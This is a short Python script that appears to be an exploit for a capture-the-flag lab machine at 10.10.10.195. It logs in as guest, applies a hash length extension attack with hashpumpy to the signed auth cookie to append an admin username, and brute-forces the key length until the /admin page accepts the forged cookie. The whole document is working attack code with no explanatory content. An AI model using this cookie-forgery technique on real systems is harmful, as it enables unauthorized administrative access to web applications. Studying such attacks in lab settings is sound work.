import requests
from base64 import b64decode, b64encode
from binascii import unhexlify
import hashpumpy

s = requests.Session()
s.post("http://10.10.10.195/postlogin", data={"username": "guest", "password": "guest"})

def is_admin(cookie):
    res = requests.get("http://10.10.10.195/admin", cookies={"auth": cookie})
    return res.status_code == 200

append = ";username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105"
auth_cookie = s.cookies["auth"]
b64_data, b64_sig = auth_cookie.split(".")
data = b64decode(b64_data)
sig = b64decode(b64_sig)

for key_len in range(8, 15):
    (new_sig, new_data) = hashpumpy.hashpump(sig.hex(), data, append, key_len)
    b64_new_sig = b64encode(unhexlify(new_sig)).decode("utf-8")
    b64_new_data = b64encode(new_data).decode("utf-8")
    cookie = b64_new_data + "." + b64_new_sig
    if is_admin(cookie):
        print("Cookie: auth=" + cookie)
        break


